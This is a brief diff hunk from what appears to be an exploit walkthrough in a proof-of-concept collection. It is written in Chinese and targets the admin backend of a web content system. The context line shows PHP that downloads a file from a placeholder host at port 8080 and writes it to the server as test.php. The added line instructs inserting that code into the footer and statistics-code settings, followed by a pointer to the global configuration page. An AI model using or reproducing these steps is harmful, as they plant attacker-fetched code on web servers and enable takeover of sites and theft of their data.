@@ -15,6 +15,9 @@ $test("http://IP:8080/1.txt","test.php");
 
 ?>
 ```
+在尾部信息和统计代码中（其他位置可能效果一样）插入php代码
+
+
 ![image](https://github.com/wy876/POC/assets/139549762/59c806d4-0ad6-41fd-b63e-8fed7966261f)
 
 然后来到全局配置-配置参数
